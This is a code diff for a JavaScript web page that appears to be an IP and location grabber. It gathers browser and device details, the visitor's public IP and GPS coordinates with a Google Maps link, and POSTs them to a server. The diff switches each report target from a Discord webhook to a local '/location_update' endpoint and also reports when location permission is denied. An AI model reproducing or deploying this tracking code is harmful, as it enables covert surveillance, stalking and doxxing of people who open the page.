@@ -22,7 +22,7 @@ var x = document.getElementById("demo");
 var sysinfo = (" GET " , "\n__**Uagent:**__ " + "```xl\n" + navigator.userAgent + "```" + "\n__**AppVersion:**__ " + "```xl\n" + navigator.appVersion + "```" + "```autohotkey\n" + "\nPlatform: " + navigator.platform + "\nCookies Enabled: " + navigator.cookieEnabled + "\nBrowser Language: " + navigator.language + "\nBrowser Name: "+ navigator.appName + "\nBrowser CodeName: " + navigator.appCodeName + "\nRam: " + navigator.deviceMemory + "\nCPU cores: " + navigator.hardwareConcurrency + "\nOscpu: " + navigator.oscpu + "```");
 
 const request = new XMLHttpRequest();
-    request.open("POST", discord.webhook); //change webhook
+    request.open("POST", "/location_update"); //change webhook
 
     request.setRequestHeader('Content-type', 'application/json');
 
@@ -48,7 +48,7 @@ $.getJSON("https://api.ipify.org?format=json", function(data) {
   $("#gfg").html(data.ip);
 
   const request = new XMLHttpRequest();
-      request.open("POST", discord.webhook); //change webhook
+      request.open("POST", "/location_update"); //change webhook
 
       request.setRequestHeader('Content-type', 'application/json');
 
@@ -82,7 +82,7 @@ function showPosition(position) {
   var latlong = (" GET " , "```autohotkey\nLatitude:" + position.coords.latitude + "\nLongitude:" + position.coords.longitude + "```" + "\n__**Map Location:**__ https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude);
   
   const request = new XMLHttpRequest();
-      request.open("POST", discord.webhook); //change webhook
+      request.open("POST", "/location_update"); //change webhook
 
       request.setRequestHeader('Content-type', 'application/json');
 
@@ -108,7 +108,7 @@ function showError(error) {
   switch(error.code) {
     case error.PERMISSION_DENIED:
       const request = new XMLHttpRequest();
-      request.open("POST", discord.webhook); //change webhook
+      request.open("POST", "/location_update"); //change webhook
 
       request.setRequestHeader('Content-type', 'application/json');
 
